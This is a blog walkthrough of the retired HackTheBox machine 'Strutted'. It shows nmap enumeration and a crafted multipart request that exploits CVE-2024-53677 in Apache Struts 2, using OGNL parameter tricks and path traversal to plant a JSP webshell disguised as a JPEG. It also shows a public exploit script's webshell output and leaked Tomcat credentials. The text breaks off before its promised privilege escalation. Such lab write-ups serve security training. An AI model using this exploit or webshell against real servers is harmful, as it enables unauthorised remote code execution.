<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!--
  The GA snippet
-->
<!-- Global site tag (gtag.js) - Google Analytics -->
<!-- <script defer src="https://www.googletagmanager.com/gtag/js?id=G-PBDJSPT2TJ"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}

    gtag('js', new Date());
    gtag('config', 'G-PBDJSPT2TJ');
  });
</script> -->

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1XKW8DYST3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-1XKW8DYST3');
</script>
  <!-- Setup Open Graph image --> 

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HTB Strutted Writeup (Walkthrough)" />
<meta name="author" content="Iven" />
<meta property="og:locale" content="en" />
<meta name="description" content="Introduction" />
<meta property="og:description" content="Introduction" />
<link rel="canonical" href="https://iven86.github.io/posts/Strutted/" />
<meta property="og:url" content="https://iven86.github.io/posts/Strutted/" />
<meta property="og:site_name" content="Iven Blog" />
<meta property="og:image" content="https://iven86.github.io/../../assets/img/medium/Strutted.png" />
<meta property="og:image:height" content="150" />
<meta property="og:image:width" content="150" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-03-27T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://iven86.github.io/../../assets/img/medium/Strutted.png" />
<meta property="twitter:title" content="HTB Strutted Writeup (Walkthrough)" />
<meta name="twitter:site" content="@iven86" />
<meta name="twitter:creator" content="@Iven" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Iven"},"dateModified":"2025-04-03T10:26:13+02:00","datePublished":"2025-03-27T17:00:00+01:00","description":"Introduction","headline":"HTB Strutted Writeup (Walkthrough)","image":{"width":150,"height":150,"url":"https://iven86.github.io/../../assets/img/medium/Strutted.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://iven86.github.io/posts/Strutted/"},"url":"https://iven86.github.io/posts/Strutted/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HTB Strutted Writeup (Walkthrough) | Iven Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Iven Blog">
<meta name="application-name" content="Iven Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    <script defer src=""></script>
  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js,npm/mermaid@10.6.0/dist/mermaid.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script async src="/assets/js/data/mathjax.js"></script>
  <script async src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>


<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/../assets/img/images/threat-icon-9.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Iven Blog</a>
    <p class="site-subtitle fst-italic mb-0">DevOps - Penetration Tester - CTF Writeups.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tag"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/donation/" class="nav-link">
            <i class="fa-fw fas fa-hand-holding-usd"></i>
            

            <span>DONATION</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/HTB-Writeup-Easy/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>HTB-WRITEUP [EASY]</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/HTB-Writeup-Medium/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>HTB-WRITEUP [MEDIUM]</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/HTB-Writeup-Hard/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>HTB-WRITEUP [HARD]</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/HTB-OSCP/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>HTB-OSCP PREPRATION WRITEUP</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/PortSwigger/" class="nav-link">
            <i class="fa-fw fas fa-box"></i>
            

            <span>PORTSWIGGER</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/privacy_policy/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>PRIVACY POLICY</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/iven86"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/iven86"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['ivenprvb','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HTB Strutted Writeup (Walkthrough)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- add class to exist <a> tag -->
        
        
        

      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HTB Strutted Writeup (Walkthrough)</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743091200"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 27, 2025
</time>

      </span>

      <!-- lastmod date -->
      
        <span>
          Updated
          <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1743668773"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Apr  3, 2025
</time>

        </span>
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/../../assets/img/medium/Strutted.png" class="popup img-link preview-img shimmer"><img src="/../../assets/img/medium/Strutted.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              
                
                </em>, <em>
              
                
                
              
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1348 words"
>
  <em>7 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HTB Strutted Writeup (Walkthrough)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HTB Strutted Writeup (Walkthrough)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  
  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4238679248235087"
     crossorigin="anonymous"></script>
<!-- Iven's blog ads -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4238679248235087"
     data-ad-slot="1267169343"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
  <div class="content">
    <h2 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Strutted, a medium-difficulty Linux machine on HackTheBox, offers a practical exploration of real-world vulnerabilities and misconfigurations. Retired as a free instant challenge, this box focuses on exploiting CVE-2024-53677, a critical remote code execution flaw in Apache Struts 2, to gain an initial foothold. The machine simulates a compromised image-hosting platform hosted via a vulnerable Docker container, emphasizing the risks of unpatched frameworks.</p>

<p>After exploiting the Struts vulnerability to upload a web shell and execute code as the tomcat user, further enumeration reveals exposed credentials in the tomcat-users.xml configuration file. These credentials pave the way for lateral movement to the user james. The privilege escalation path then leverages a classic misconfiguration: improper sudo permissions for tcpdump, enabling attackers to craft a malicious payload that grants root access by manipulating SUID binaries.</p>

<p>This machine underscores essential penetration testing concepts, including exploiting public CVEs, auditing configuration files for credential leakage, and abusing elevated privileges. Additionally, post-exploration reveals intriguing details such as a Systemd security mechanism and Tomcat configuration quirks, adding depth to the learning experience. Strutted serves as a valuable exercise in vulnerability chaining and reinforces the importance of proactive system hardening.</p>

<h2 id="info"><span class="me-2">INFO</span><a href="#info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Machine IP = 10.10.11.59
OS = Linux
Level = MEDIUM
Points = 30</p>

<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="port-scanning"><span class="me-2">Port Scanning</span><a href="#port-scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/code 10.10.11.59
</pre></td></tr></tbody></table></code></div></div>
<p>Nmap scan report for strutted.htb (10.10.11.59)</p>

<p>Open Ports:</p>
<ul>
  <li>22/tcp OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</li>
  <li>80/tcp nginx 1.18.0 (Ubuntu)</li>
</ul>

<h3 id="web-enumeration"><span class="me-2">Web Enumeration</span><a href="#web-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The initial phase began by adding the domain strutted.htb to /etc/hosts to resolve the target IP:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.129.231.200 strutted.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts  
</pre></td></tr></tbody></table></code></div></div>
<p>Visiting http://strutted.htb revealed a static website for an image-hosting service. The Download link offered a Docker environment (strutted.zip), which was critical for understanding the application’s architecture. Unzipping the file exposed the source code and configuration files:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>unzip strutted.zip
</pre></td></tr></tbody></table></code></div></div>

<h4 id="key-files-included"><span class="me-2">Key files included:</span><a href="#key-files-included" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>
    <p>Dockerfile: Revealed the use of tomcat:9.0 and openjdk:17, with the application deployed as ROOT.war.</p>
  </li>
  <li>
    <p>tomcat-users.xml: Contained credentials (admin:skqKY6360z!Y), but these were deemed irrelevant for direct exploitation.</p>
  </li>
  <li>
    <p>pom.xml: Highlighted dependencies, notably Apache Struts 2 v6.3.0.1, a version vulnerable to CVE-2024-53677 (RCE via malicious file upload).</p>
  </li>
</ul>

<h4 id="analyzing-the-vulnerability"><span class="me-2">Analyzing the Vulnerability</span><a href="#analyzing-the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The pom.xml dependency tree confirmed the use of Struts 2’s FileUploadInterceptor, which mishandled OGNL expressions in the filename parameter. This allowed path traversal and arbitrary file uploads. The vulnerability hinged on bypassing security checks in the ParametersInterceptor#isAccepted method, which validated parameter names against a regex.</p>

<h4 id="exploit-crafting"><span class="me-2">Exploit Crafting</span><a href="#exploit-crafting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>A legitimate image upload was intercepted in BurpSuite to analyze the request structure. The Struts 2 framework processed the filename parameter dynamically, enabling OGNL injection. By crafting a payload to manipulate the UploadFileName parameter, the filename could be overwritten:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>POST /upload.action HTTP/1.1  
Host: strutted.htb  
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">----WebKitFormBoundary</span>  

<span class="nt">------WebKitFormBoundary</span>  
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"Upload"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"legit.gif"</span>  
Content-Type: image/gif  

<span class="o">[</span>Malicious content]  
<span class="nt">------WebKitFormBoundary</span>  
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"top.UploadFileName"</span>  

shell.jsp  
<span class="nt">------WebKitFormBoundary--</span>  
</pre></td></tr></tbody></table></code></div></div>
<p>This payload exploited the value stack to redefine UploadFileName as shell.jsp, bypassing regex checks by avoiding prohibited characters (e.g., []). The crafted request uploaded a web shell to the Tomcat server, setting the stage for RCE.</p>

<h4 id="key-takeaways"><span class="me-2">Key Takeaways</span><a href="#key-takeaways" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>
    <p>Docker Analysis: Exposed Tomcat 9 and Struts 2 configuration, guiding vulnerability research.</p>
  </li>
  <li>
    <p>Struts 2 Flaw: Misconfigured file upload handling allowed OGNL injection via parameter manipulation.</p>
  </li>
  <li>
    <p>Bypass Technique: Simplified OGNL expressions (top.UploadFileName) circumvented security regex, enabling arbitrary file uploads.</p>
  </li>
</ul>

<p>This phase transitioned into executing the payload to gain a foothold as the tomcat user, leveraging the uploaded web shell.</p>

<h2 id="initial-foothold"><span class="me-2">Initial Foothold</span><a href="#initial-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Exploiting CVE-2024-53677 (Apache Struts 2 Path Traversal to RCE)</p>

<p>The vulnerability stems from improper handling of file upload parameters in Apache Struts 2’s FileUploadInterceptor. By manipulating the filename field with OGNL expressions, an attacker can bypass security checks and write arbitrary files to the server.</p>

<h3 id="bypassing-security-mechanisms"><span class="me-2">Bypassing Security Mechanisms:</span><a href="#bypassing-security-mechanisms" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>The application enforced strict checks:</p>

<ul>
  <li>
    <p>MIME Type Validation: Only image/jpeg, image/png, or image/gif were allowed.</p>
  </li>
  <li>
    <p>Magic Bytes Verification: Files were validated against image-specific byte headers (e.g., FF D8 FF for JPEGs).</p>
  </li>
</ul>

<p>To bypass these:</p>

<ul>
  <li>
    <p>A malicious JSP webshell was embedded into a valid image file (e.g., test.jpg), preserving the magic bytes.</p>
  </li>
  <li>
    <p>The filename parameter was modified to capitalize Upload (name=”Upload”), exploiting case sensitivity discrepancies in Struts 2’s parameter parsing.</p>
  </li>
  <li>
    <p>The top.UploadFileName parameter was injected with a path traversal payload (../../shell.jsp) to write the file outside the restricted upload directory.</p>
  </li>
</ul>

<h3 id="final-exploit-payload"><span class="me-2">Final Exploit Payload:</span><a href="#final-exploit-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="err">POST /upload.action HTTP/1.1  
Host: strutted.htb  
Content-Type: multipart/form-data; boundary=---------------------------40206448941825625594104915613  

-----------------------------40206448941825625594104915613  
Content-Disposition: form-data; name="Upload"; filename="test.jpg"  
Content-Type: image/jpeg  

ÿØÿà... [JPEG Magic Bytes]  
&lt;%@ page import="java.io.*" %&gt;  
&lt;%  
   String cmd = request.getParameter("cmd");  
   Process p = Runtime.getRuntime().exec(cmd);  
   ... [JSP Webshell Logic]  
%&gt;  
-----------------------------40206448941825625594104915613  
Content-Disposition: form-data; name="top.UploadFileName"  

../../webshell.jsp  
-----------------------------40206448941825625594104915613--  
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="automated-exploitation-with-cve-2023-50164-script"><span class="me-2">Automated Exploitation with CVE-2023-50164 Script</span><a href="#automated-exploitation-with-cve-2023-50164-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The GitHub exploit <a href="https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE">jakabakos/CVE-2023-50164-Apache-Struts-RCE</a> was adapted for this scenario. The script automates payload generation and uploads a WAR-based webshell:</p>

<h4 id="execution"><span class="me-2">Execution:</span><a href="#execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>python3 exploit.py <span class="nt">--url</span> http://strutted.htb/upload.action  
</pre></td></tr></tbody></table></code></div></div>
<h4 id="output"><span class="me-2">Output:</span><a href="#output" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="o">[</span>+] webshell.war uploaded successfully.  
<span class="o">[</span>+] Reach the JSP webshell at http://strutted.htb/webshell/webshell.jsp?cmd<span class="o">=</span>&lt;COMMAND&gt;  
<span class="o">[</span>+] Successfully connected to the web shell.  
CMD <span class="o">&gt;</span>   
</pre></td></tr></tbody></table></code></div></div>

<h4 id="key-observations"><span class="me-2">Key Observations</span><a href="#key-observations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>
    <p>Case Sensitivity: Capitalizing Upload bypassed parameter validation.</p>
  </li>
  <li>
    <p>Path Traversal: The top.UploadFileName payload wrote the JSP file to webapps/ROOT, making it accessible directly under the root context.</p>
  </li>
  <li>
    <p>Defense Evasion: Embedding the JSP payload into an image file bypassed magic byte checks while retaining execution capabilities.</p>
  </li>
</ul>

<p>This foothold paved the way for lateral movement to james from /etc/passwd via exposed credentials in tomcat-users.xml and eventual privilege escalation to root</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>james:x:1000:1000:Network Administrator:/home/james:/bin/bash

<span class="o">[</span>+] Found valid user account:
    Username: james
    UID/GID:  1000/1000
    Shell:    /bin/bash
</pre></td></tr></tbody></table></code></div></div>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>&lt;!--
  &lt;user username="admin" password="&lt;must-be-changed&gt;" roles="manager-gui"/&gt;
  &lt;user username="robot" password="&lt;must-be-changed&gt;" roles="manager-script"/&gt;
  &lt;role rolename="manager-gui"/&gt;
  &lt;role rolename="admin-gui"/&gt;
  &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;
---&gt;
</pre></td></tr></tbody></table></code></div></div>

